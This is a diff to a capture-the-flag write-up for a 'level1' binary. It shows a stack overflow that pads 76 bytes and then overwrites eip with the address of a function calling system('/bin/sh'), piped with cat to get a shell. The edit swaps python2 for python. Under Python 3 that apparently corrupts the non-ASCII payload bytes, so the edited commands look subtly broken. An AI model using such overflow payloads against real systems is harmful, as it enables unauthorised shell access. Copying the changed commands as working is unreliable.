@@ -15,7 +15,7 @@ Through experimentation, we find we can overwrite `eip` from character 77 to cha
 We use Python to make our output easier :
 
 ```
-python2 -c 'print("A" * 76 + DESIRED_ADDRESS)'
+python -c 'print("A" * 76 + DESIRED_ADDRESS)'
 ```
 
 `disas run` gave us the address of run : `0x08048444`. We add it to our output, reversing to bytes to account for endianness :
@@ -27,7 +27,7 @@ python2 -c 'print("A" * 76 + "\x44\x84\x04\x08")'
 Finally, we have to pipe it into the executable. But there's an issue : when `system("/bin/sh")` is ran, it'll read from `stdin`, and since we're overloading `stdin`, we'll need to add a `cat` in the mix. We run :
 
 ```
-( python2 -c 'print("A" * 76 + "\x44\x84\x04\x08")' ; cat ) | ./level1
+( python -c 'print("A" * 76 + "\x44\x84\x04\x08")' ; cat ) | ./level1
 ```
 
 ## **The flag**
